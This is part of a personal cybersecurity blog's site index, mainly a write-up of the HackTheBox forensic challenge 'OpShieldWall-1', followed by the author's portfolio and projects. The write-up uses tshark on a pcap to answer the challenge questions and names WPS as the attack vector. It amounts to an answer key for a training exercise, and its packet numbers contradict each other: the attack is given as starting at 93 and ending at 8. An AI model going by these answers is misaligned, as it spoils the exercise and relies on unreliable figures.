responding to our call. The Ministry of Defense of Velorian is in desperate need of assistance\u0026hellip;\nWe need to keep this discreet, but we believe that the public WiFi at the Ministry of Defense offices in Velorian has been compromised. The impact seems minimal, but network diagrams show that no real segmentation of the network has been implemented and that device-to-device traffic is allowed. Government ministers use this network with BYoD equipment and Velorian MoDNet hosts. Please analyze the provided pcap file and confirm how and when this occurred. Remember that this investigation is classified as TLP Amber.\nFiles #\ropshieldwall1.zip containing the network capture \u0026ldquo;VELORIA-NETWORK.pcap\u0026rdquo; Setup #\rGiven the simplicity of this challenge, we can limit ourselves to tshark / wireshark.\nQuestions #\rQuestion 1 #\rPlease confirm the SSID of our WiFi network.\nFirst, let’s get familiar with the capture. We’ll use the following command to gather some statistics:\n$ tshark -r traffic.pcapng -qz -r allows reading a file -q makes the output quieter (useful for stats as it displays global statistics, not per packet) -z enables statistics display There are many possible values (tshark -z help to display them), but here we primarily want to know:\nthe packet count the capture duration the IPv4 addresses with the most packets the IPv4 endpoints exchanging the most the most used protocols Packet count and duration: 106; 31.6 sec\n$ tshark -r VELORIA-NETWORK.pcap -qz io,stat,0 =================================== | IO Statistics | | | | Duration: 31.6 secs | | Interval: 31.6 secs | | | | Col 1: Frames and bytes | |---------------------------------| | |1 | | | Interval | Frames | Bytes | | |-------------------------------| | | 0.0 \u0026lt;\u0026gt; 31.6 | 106 | 20759 | | =================================== IPv4 endpoints:\nwith the most packets: $ tshark -r VELORIA-NETWORK.pcap -qz endpoints,ip ================================================================================ IPv4 Endpoints Filter:\u0026lt;No Filter\u0026gt; | Packets | | Bytes | | Tx Packets | | Tx Bytes | | Rx Packets | | Rx Bytes | 0.0.0.0 3 1044 3 1044 0 0 255.255.255.255 3 1044 0 0 3 1044 10.0.3.1 3 1048 3 1048 0 0 10.0.3.52 3 1048 0 0 3 1048 ================================================================================ exchanging the most: tshark -r VELORIA-NETWORK.pcap -qz conv,ip ================================================================================ IPv4 Conversations Filter:\u0026lt;No Filter\u0026gt; | \u0026lt;- | | -\u0026gt; | | Total | Relative | Duration | | Frames Bytes | | Frames Bytes | | Frames Bytes | Start | | 0.0.0.0 \u0026lt;-\u0026gt; 255.255.255.255 0 0 bytes 3 1044 bytes 3 1044 bytes 23.256576000 8.3680 10.0.3.1 \u0026lt;-\u0026gt; 10.0.3.52 0 0 bytes 3 1048 bytes 3 1048 bytes 23.256959000 8.3693 ================================================================================ Most used protocols:\ntshark -r VELORIA-NETWORK.pcap -qz io,phs =================================================================== Protocol Hierarchy Statistics Filter: sll frames:106 bytes:20759 radiotap frames:92 bytes:17572 wlan_radio frames:92 bytes:17572 wlan frames:92 bytes:17572 wlan.mgt frames:92 bytes:17572 eapol frames:6 bytes:999 eap frames:6 bytes:999 ip frames:6 bytes:2092 udp frames:6 bytes:2092 dhcp frames:6 bytes:2092 arp frames:2 bytes:96 =================================================================== To answer, we can simply use the command:\n$ tshark -r VELORIA-NETWORK.pcap -T fields -e wlan.ssid | head -n 1 | xxd -r -p VELORIA-MoD-AP012 Explication : (https://www.wireshark.org/docs/dfref/w/wlan.html)\n-t displays only user-specified fields (thus requiring the use of the -e option to specify fields) -e wlan.ssid specifies that the wlan.ssid field (SSID of wireless networks) should be extracted and displayed -xxd -r -p converts the output from hexadecimal to readable text Answer : VELORIA-MoD-AP012\nQuestion 2 #\rPlease confirm the MAC address of the access point (AP).\ntshark -r VELORIA-NETWORK.pcap -T fields -e wlan.sa | head -n 1 02:00:00:00:01:00 Answer : 02:00:00:00:01:00\nQuestion 3 #\rPlease confirm the AP’s authentication state/mechanism and attack vector.\nSwitching to Wireshark.\nAnswer : WPS\nQuestion 4 #\rWhat is the packet number where the attack began?\nWe can easily deduce that it’s at the first connection attempt (the only one in the capture).\nAnswer : 93\nQuestion 5 #\rWhat is the packet number where the attack ended?\nIt’s clear that it ends when the authentication fails.\nAnswer : 8\n","date":"7 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/posts/opshieldwall-1/","section":"Posts","summary":"Scenario #\rThank you for responding to our call.","title":"OpShieldWall-1","type":"posts"},{"content":"\rDiplomas #\rThe images are clickable links.\nIn progress Master’s Degree (BAC+5) - Expert in Data, Network, and System Security\nOnly available through work-study programs\nI conduct motivation and technical interviews for new admissions\n(N° RNCP 38951) Bachelor’s Degree (BAC+3) - Cybersecurity \u0026 Ethical Hacking\n3rd year in work-study program\nWith Highest Honour\rBachelor’s Degree (BAC+3) - Network and Systems Architect\nWith Highest Honour\rList of all the challenges, labs, boxes, etc., that I have completed, as well as conferences and trainings I have attended:\nHackTheBox #\rIron = Insane Red = Hard Orange = Medium Green = Easy Purple = Very Easy Some images do not link to the HTB result pages as they are boxes/Sherlocks only available on the HackTheBox Enterprise platform (which does not allow for shareable links).\nSherlock #\rDFIR / SOC #\rOpShieldWall-7\rStreamer\rAPTNightmare-2\rLatus\rHeartbreaker\rTrent\rAPTNightmare\rNuts\rOpShieldWall-4\rOpShieldWall-2\rOpShieldWall-1\rNeuroSync-D\rPikaptcha\rMeerkat\rBumblebee\rJingle Bell\rRecollection\rKuber\rNoted\rTracer\rLog Jammer\rRogue One\rPhantom-Check\rSmoke-Mirrors\rOrigins\rSmartyPants\rReaper\rCampfire-2\rCampfire-1\rUnit42\rCrownJewel-2\rCrownJewel-1\rBrutus\rNoxious\rMalware Analysis #\rOpShieldWall-6\rLoggy\rHB-Continuum\rCloud #\rNubilum-2\rThreat Intelligence #\rDreamJob-1\rElectricBreeze-1\rUFO-1\rBox #\rLinux #\rOpShieldWall-5\rOpShieldWall-3\rBlurry\rRunner\rIClean\rPerfection\rBoardLight\rHeadless\rWifinetic\rMetaTwo\rLame\rNibbles\rPrecious\rWindows #\rJerry\rNetmon\rBlue\rHackTheBox Academy #\rTranscript.pdf\nRootMe #\rCyberdefenders #\rThreat Hunting #\rHard\rNetwork Forensics #\rHard\rMedium\rMedium\rMedium\rMedium\rMedium\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEndpoint Forensics #\rMedium\rEasy\rThreat Intel #\rMedium\rMedium\rEasy\rEasy\rEasy\rEasy\rCloud Forensics #\rEasy\rTryHackMe #\r92 rooms completed\nPath :\nPre Security Complete Beginner Web Fundamentals Comptia Pentest+ Courses and training completed #\r2025 #\rSANS : FOR585: Smartphone Forensic Analysis In-Depth 13Cubed : Investigating Windows Endpoint 13Cubed : Investigating Windows Memory 13Cubed : Investigating Linux Devices 2024 #\rEvasive Malware : A Field Guide to Detecting, Analyzing, and Defeating Advanced Threats Roman Stuehler : Android App Hacking - Black Belt Edition Kaspersky : Advanced Malware Analysis Techniques Kaspersky : Hunting APTs like a Ninja with YARA OALABS : Reverse Engineering 101 (RE101) Pentherz : Intro to SDR Hacking 2023 #\rOSINT : IntelTechniques Christopher Negus : Linux Bible Opdisk : The Cyber Plumber\u0026rsquo;s Handbook Conf \u0026amp; meetups #\r2025 #\rTHCON 2025\r2024 #\rDEFCON Paris\rMeetups HTB France\r2023 #\rHexacon\rDEFCON Paris\rLeHack\rHTB Meetups France\r","date":"6 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/posts/portfolio/","section":"Posts","summary":"Diplomas #\rThe images are clickable links.","title":"Portfolio","type":"posts"},{"content":"\rSelf-Hosted Infrastructure #\rJuin 2023 - maintenant\nProfessional Server (HP ProLiant DL380 Gen9 2U) running Proxmox Firewall running OPNsense Self-hosted services and tools: VPN, Security Onion, Wazuh, Cuckoo Sandbox, GitLab, CTF machines, various labs (red team / blue team) A special Malware Analysis lab \u0026amp; OSINT lab with security, privacy and OPSEC in mind Architecture, network segmentation, IPS/IDS integration, load balancing, SRE, VPN CTF Challenge Creator #\rJuin 2024 - Juin 2024\nCreation of two radio challenges (misc easy and medium) for the \u0026ldquo;PwnMe CTF 2024\u0026rdquo;.\nhttps://ctftime.org/ctf/807/\nhttps://www.phreaks2600.fr/\nSide Quest - Toolkit Network Forensic \u0026amp; Malware Analysis #\rFévr. 2024 - Juin 2024\nOur Side Quest is a collaborative student project designed to provide a powerful toolkit for network forensic analysis and malware analysis. This repository contains two sub-projects that focus on different aspects of investigation:\nNetwork Forensic Analysis: Tools for analyzing network traffic captured in PCAP files. Malware Analysis: Tools for dissecting binary files to uncover hidden information and detect malicious characteristics. https://github.com/jaybird1291/toolkit-network-forensic-malware-analysis-sidequest\n","date":"5 May 2024","externalUrl":null,"permalink":"/blog-cyber/en/posts/projets/","section":"Posts","summary":"Self-Hosted Infrastructure #\rJuin 2023 - maintenant","title":"Projets","type":"posts"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/en/series/","section":"Series","summary":"","title":"Series","type":"series"}]